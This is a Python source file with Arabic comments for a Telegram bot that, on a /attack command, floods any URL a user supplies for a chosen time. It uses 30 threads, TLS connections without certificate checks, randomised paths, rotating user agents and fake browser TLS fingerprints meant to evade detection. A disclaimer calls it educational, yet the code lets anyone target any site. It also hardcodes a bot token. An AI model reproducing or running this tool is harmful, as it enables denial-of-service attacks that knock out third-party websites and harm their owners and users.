import random
import time
import socket
import ssl
import threading
from urllib.parse import urlparse
import hashlib
import telebot
from telebot import types

# تهيئة بوت التيليجرام
TOKEN = '7333263562:AAE7SGKtGMwlbkxNroPyh3MBvY8EUc2PCmU'
bot = telebot.TeleBot(TOKEN)

class AdvancedChallengeTool:
    def __init__(self):
        self.stop_event = threading.Event()
        self.user_agents = self._generate_realistic_useragents()
        self.tls_fingerprints = self._generate_tls_fingerprints()
        self.active_attacks = {}
        self.legal_warning = """
        ⚠️ تحذير: هذا الكود للأغراض التعليمية والبحثية فقط
        ⚠️ استخدامه ضد أنظمة دون إذن غير قانوني
        ⚠️ يمكنك استخدامه فقط لاختبار أنظمتك الخاصة
        """

    def _generate_realistic_useragents(self):
        """إنشاء عوامل مستخدم واقعية"""
        versions = {
            'chrome': [f'Chrome/{random.randint(100,115)}.0.{random.randint(1000,9999)}.{random.randint(1,100)}' 
                      for _ in range(20)],
            'firefox': [f'Firefox/{random.randint(100,115)}.0' for _ in range(20)],
            'safari': [f'Version/{random.randint(15,17)}.{random.randint(0,5)}' 
                      for _ in range(20)]
        }
        
        return [
            f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) {random.choice(versions['chrome'])} Safari/537.36",
            f"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) {random.choice(versions['safari'])}",
            f"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 {random.choice(versions['firefox'])}"
        ]

    def _generate_tls_fingerprints(self):
        """إنشاء بصمات TLS لمحاكاة متصفحات حقيقية"""
        return [
            {
                'ciphers': [
                    'TLS_AES_128_GCM_SHA256',
                    'TLS_CHACHA20_POLY1305_SHA256',
                    'TLS_AES_256_GCM_SHA384',
                    'ECDHE-ECDSA-AES128-GCM-SHA256'
                ],
                'extensions': [
                    'server_name',
                    'extended_master_secret',
                    'renegotiation_info',
                    'supported_groups',
                    'ec_point_formats',
                    'session_ticket'
                ]
            }
        ]

    def _create_stealth_tls_connection(self, target, port=443):
        """إنشاء اتصال TLS متخفي"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((target, port))
            
            context = ssl.SSLContext(ssl.PROTOCOL_TLS)
            context.set_ciphers(':'.join(random.choice(self.tls_fingerprints)['ciphers']))
            context.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3
            context.verify_mode = ssl.CERT_NONE
            
            tls_sock = context.wrap_socket(sock, server_hostname=target)
            return tls_sock
        except Exception as e:
            return None

    def _send_http_request(self, sock, target, path="/"):
        """إرسال طلب HTTP مع رؤوس مخصصة"""
        try:
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Cache-Control': 'max-age=0',
                'TE': 'trailers'
            }
            
            request = f"GET {path} HTTP/1.1\r\nHost: {target}\r\n"
            request += "\r\n".join(f"{k}: {v}" for k, v in headers.items())
            request += "\r\n\r\n"
            
            sock.send(request.encode())
            response = sock.recv(4096).decode(errors='ignore')
            return response
        except:
            return None

    def start_attack(self, chat_id, target, duration=60):
        """بدء هجوم على هدف معين"""
        if chat_id in self.active_attacks:
            return False

        parsed = urlparse(target)
        if not parsed.netloc:
            return False

        host = parsed.netloc
        self.active_attacks[chat_id] = {
            'target': host,
            'stop_event': threading.Event(),
            'threads': []
        }

        def worker(stop_event):
            end_time = time.time() + duration
            while time.time() < end_time and not stop_event.is_set():
                try:
                    sock = self._create_stealth_tls_connection(host)
                    if sock:
                        path = f"/{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
                        self._send_http_request(sock, host, path)
                        sock.close()
                    time.sleep(random.uniform(0.5, 2.0))
                except:
                    pass

        # بدء 30 خيطًا للهجوم
        for _ in range(30):
            t = threading.Thread(target=worker, args=(self.active_attacks[chat_id]['stop_event'],))
            t.daemon = True
            t.start()
            self.active_attacks[chat_id]['threads'].append(t)

        return True

    def stop_attack(self, chat_id):
        """إيقاف الهجوم الحالي"""
        if chat_id in self.active_attacks:
            self.active_attacks[chat_id]['stop_event'].set()
            for t in self.active_attacks[chat_id]['threads']:
                t.join()
            del self.active_attacks[chat_id]
            return True
        return False

# إنشاء مثيل من الأداة
tool = AdvancedChallengeTool()

# أوامر التيليجرام
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, tool.legal_warning + "\n\nالأوامر المتاحة:\n/attack [URL] [الوقت بالثواني] - بدء الهجوم\n/stop - إيقاف الهجوم")

@bot.message_handler(commands=['attack'])
def start_attack(message):
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "استخدم: /attack [URL] [الوقت بالثواني]")
            return

        url = args[1]
        duration = int(args[2]) if len(args) > 2 else 60

        if tool.start_attack(message.chat.id, url, duration):
            bot.reply_to(message, f"✅ بدء الهجوم على {url} لمدة {duration} ثانية")
        else:
            bot.reply_to(message, "❌ فشل بدء الهجوم، تأكد من صحة الرابط")
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ: {str(e)}")

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    if tool.stop_attack(message.chat.id):
        bot.reply_to(message, "✅ تم إيقاف الهجوم بنجاح")
    else:
        bot.reply_to(message, "❌ لا يوجد هجوم نشط لإيقافه")

# بدء البوت
print("Bot is running...")
bot.polling()
